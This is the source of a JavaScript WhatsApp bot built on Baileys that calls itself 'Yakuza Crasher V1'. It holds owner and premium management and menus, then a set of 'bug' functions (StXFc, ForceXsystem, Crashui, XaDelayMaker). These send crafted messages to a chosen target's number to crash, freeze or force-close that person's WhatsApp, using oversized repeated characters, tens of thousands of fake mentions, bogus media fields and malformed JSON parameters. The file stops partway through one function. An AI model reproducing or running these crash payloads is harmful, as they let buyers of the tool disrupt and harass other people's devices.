/*

€ Creator: Xyroo OFC
€ Base: Xyroo OFC
*Social Media*
 Github: https://github.com/xyroodep
 Youtube: https://youtube.com/@xyrooofc
 Telegram: https://t.me/xyroosigma
 
<!> 
#Creator ( Xyroo OFC )
©2025 - Xyroo

ini adalah base bot whatsapp simple buatanku jadi pakai aja kalau kamu tertarik.


#Developer ( Xyroo OFC )
©2025 - Xyroo

This is my simple WhatsApp bot base, so feel free to use it if you're interested.

Don't Remove This Credits

*/
require('../settings/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}
//=================================================//
// Function Main — Menu
//=================================================//

const imageList = [
    fs.readFileSync("Media/YakuzaMenu2.png")
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const menuImages = [
    fs.readFileSync("Media/YakuzaMenu1.png")
];
const selectedImage = menuImages[Math.floor(Math.random() * menuImages.length)];

const bugImages = [
    fs.readFileSync("Media/yakuzasendbug.png")
];
const bugimage = bugImages[Math.floor(Math.random() * bugImages.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: null,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`⏤͟͟͞͞𝑿𝒚𝒓𝒐𝒐 🎭\ncommand from: @${m.sender.split('@')[0]}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
};

const ReplyBug = async (teks) => {
  const buttons = [{ buttonId: '.menu', buttonText: { displayText: 'Menu' } }];
  const buttonMessage = {
    image: bugimage,
    caption: teks,
    footer: 'િ፷𝑿̶𝒚̈́͟𝒓𝒐𝒐𝑫̽͢𝒆𝒗፮▾ ༑̴⟆',
    buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422899706414@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐗͢𝐲𝐫𝐨𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net']
    },
    viewOnce: true
  };
  await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
};

const ReplyButton = async (teks) => {
  const buttons = [{ buttonId: '.menu', buttonText: { displayText: 'Menu' } }];
  const buttonMessage = {
    image: RandomMenu,
    caption: teks,
    footer: 'િ፷𝑿̶𝒚̈́͟𝒓𝒐𝒐𝑫̽͢𝒆𝒗፮▾ ༑̴⟆',
    buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422899706414@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐗͢𝐲𝐫𝐨𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net']
    },
    viewOnce: true
  };
  await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
};

const ReplyImageX = async (teks) => {
  const buttonMessage = {
    image: RandomMenu,
    caption: teks,
    footer: 'િ፷𝑿̶𝒚̈́͟𝒓𝒐𝒐𝑫̽͢𝒆𝒗፮▾ ༑̴⟆',
    headerType: 4,
    contextInfo: {
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422899706414@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐗͢𝐲𝐫𝐨𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      externalAdReply: {
        showAdAttribution: true,
        title: '𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝗵𝘀𝗲𝗿 𝗩𝟭',
        body: '𝗫𝘆𝗿𝗼𝗼 𝗗𝗲𝘃',
        mediaType: 1,
        renderLargerThumbnail: false,
        thumbnail: selectedImage,
        sourceUrl: 'https://www.youtube.com/@xyrooofc'
      },
      mentionedJid: [m.sender]
    },
    viewOnce: true
  };

  const nativeFlowButton = {
    buttonId: 'bugmenu',
    buttonText: { displayText: 'Open Bug ☇' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'Select ☇ Menu',
        sections: [
          {
            title: '⌜𝐘𝐚𝐤𝐮𝐳𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐁𝐨𝐭🎭 ⌟',
            rows: [
              {
                header: '𝚯𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔',
                title: 'Owner Menu',
                description: 'Menampilkan owner menu',
                id: '.ownermenu'
              },
              {
                header: '𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫',
                title: 'Developer Script',
                description: 'Menampilkan developer script',
                id: '.dev'
              },
              {
                header: '𝐂𝐫𝐞𝐝𝐢𝐭𝐬',
                title: 'Credits Script',
                description: 'Menampilkan credits script',
                id: '.tqto'
              }
            ]
          },
          {
            title: '⌜ ㅊ - 𝐕𝐈𝐏 𝐁𝐔𝐆🦠 ⌟',
            rows: [
              {
                header: '𝐗𝐁͢𝐔𝐆 ☇ 𝐈𝐍𝐅͢𝐈𝐍𝐈͢𝐓𝐘',
                title: 'Bug Menu',
                description: 'Menampilkan bug menu',
                id: '.xbug'
              }
            ]
          }
        ]
      })
    }
  };

  return await client.sendMessage(m.chat, {
    ...buttonMessage,
    buttons: [nativeFlowButton]
  }, { quoted: lol });
};

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Menu
//=================================================//

switch(command) {
case 'start':
case 'help':
case 'menu': {
let Menu = `( 💬 ) - Hello, ${info}!
Welcome to Yakuza Crasher V1,
I was created with the aim of helping my owner.

*- 計さ INFORMATION BOT*
 ⌬ Botname : Yakuza Crasher 
 ⌬ Owner : Xyroo
 ⌬ Version : 1.0.0
 ⌬ Status: ${isCreator ? "Vvip Buyyer Only" : isPremium ? "Premium" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}

( ! ) Please press the button below`
ReplyImageX(Menu)
}
break;

case 'ownermenu': {
let Menu = `( 💬 ) - Hello, ${info}!
Welcome to Yakuza Crasher V1,
I was created with the aim of helping my owner.

*- 計さ INFORMATION BOT*
 ⌬ Botname : Yakuza Crasher 
 ⌬ Owner : Xyroo
 ⌬ Version : 1.0.0
 ⌬ Status: ${isCreator ? "Vvip Buyyer Only" : isPremium ? "Murbug Vvip" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}

 *- 計さ COMMAND OWNER*
 ▢ .addowner
 ▢ .delowner
 ▢ .addpremium
 ▢ .delpremium
 ▢ .listpremium
 ▢ .listowner
 ▢ .public
 ▢ .private
 ▢ .clearsesi`
ReplyImageX(Menu)
}
break;

case 'xbug':
case 'bugmenu': {
client.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });
let Menu = `( 💬 ) - Hello, ${info}!
Welcome to Yakuza Crasher V1,
I was created with the aim of helping my owner.

*- 計さ INFORMATION BOT*
 ⌬ Botname : Yakuza Crasher 
 ⌬ Owner : Xyroo
 ⌬ Version : 1.0.0
 ⌬ Status: ${isCreator ? "Vvip Buyyer Only" : isPremium ? "Murbug Vvip" : "Not Acces"}
 ⌬ Runtime: ${runtime(process.uptime())}

 *- 計さ COMMAND BUG*
 ▢ .yakuza-delayhard
 ▢ .yakuza-delaymaker
 ▢ .yakuza-delaycombo
 ▢ .yakuza-crashandro
 ▢ .yakuza-blank
 ▢ .yakuza-forceclose
 ▢ .yakuza-freeze`
ReplyImageX(Menu)
}
break;
//=================================================//
// Function Owner
//=================================================//

case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'listpremium':
case 'listprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User Premium:*\n\n`;
    for (let i = 0; i < Premium.length; i++) {
        textList += `${i + 1}. wa.me/${Premium[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listowner':
case 'listown': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner Bot:*\n\n`;
    for (let i = 0; i < owner.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case 'public': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = true;
    ReplyButton("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = false;
    ReplyButton("Bot set to private mode.");
}
break;

case "clsesi":
case "clearsesi":
case "clearsession": {
  try {
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
    const dirsampah = fs.readdirSync("./system/cache").filter(e => e !== "A")

    for (const file of dirsesi) {
      await fs.promises.unlink(`./session/${file}`)
    }

    for (const file of dirsampah) {
      await fs.promises.unlink(`./system/cache/${file}`)
    }

    m.reply(`*Berhasil membersihkan sampah ✅*\n` +
            `*${dirsesi.length}* sampah session\n` +
            `*${dirsampah.length}* sampah file`)
  } catch (err) {
    console.error("Gagal membersihkan sesi:", err)
    m.reply("*Terjadi kesalahan saat membersihkan sesi ❌*")
  }
}
break;

case "cekidch": case "idch": {
if (!text) return ReplyButton(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return ReplyButton(teks)
}
break;
//=================================================//
// Tqto
//=================================================//
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `િ፷𝑿̶𝒚̈́͟𝒓𝒐𝒐𝑫̽͢𝒆𝒗፮▾ ༑̴⟆`
  let NoOwn = `6287779101885`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐗𝐲𝐫𝐨𝐨𝐃𝐞𝐯🐉\nX-WA-BIZ-NAME:[[ િ፷𝑿̶𝒚̈́͟𝒓𝒐𝒐𝑫̽͢𝒆𝒗፮▾ ༑̴⟆ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  client.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;

case "tqto":
case "credits": {
let Menu = `┏━━⬣  Thanks To  友
┃ 🔥 Allah </> My God\`
┃ 🔥 Ortu </> My Support
┃ 🔥 XyrooOFC </> Developer
┗━━⬣  ⿻  ⌜ 𝐗͢𝐘͡𝐑͢𝐎͡𝐎🐉 ⌟  ⿻

> WhatsApp Bot 2025 By XyrooDev
`
ReplyButton(Menu)
}
break;
//=================================================//
// Function Bug
//=================================================//
async function StXFc(client, jid) {
console.log(chalk.red(`Succes Send Bug To Target ${jid}`));
  let baten = [];
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
      contextInfo: {
        participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
                },
                body: { text: "🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: baten,
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };
    await client.relayMessage(jid, stxview, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid
    });
}

async function ForceXsystem(client, target) {
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡" + "ꦾ".repeat(35000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(15000),
            buttons: [
              {
              name: "single_select",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "call_permission_request",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_url",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_call",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_copy",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_cancel_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "address_message",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "send_location",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "quick_reply",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "mpm",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
            ],
          },
        },
      },
    },
  };

  await client.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function Crashui(target) {
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
      let Crash = "🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡" + "ꦾ".repeat(65000);
      await client.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: Crash,
            url: "https://youtube.com/@xyrooofc",
            address: "𑇂𑆵𑆴𑆿".repeat(45000),
          },
          hasMediaAttachment: true,
        },
        {
          participant: {
           jid: target,
           mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                  ),
                 ]
          },
        }
      );
    }
    
async function XaDelayMaker(target) { 
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
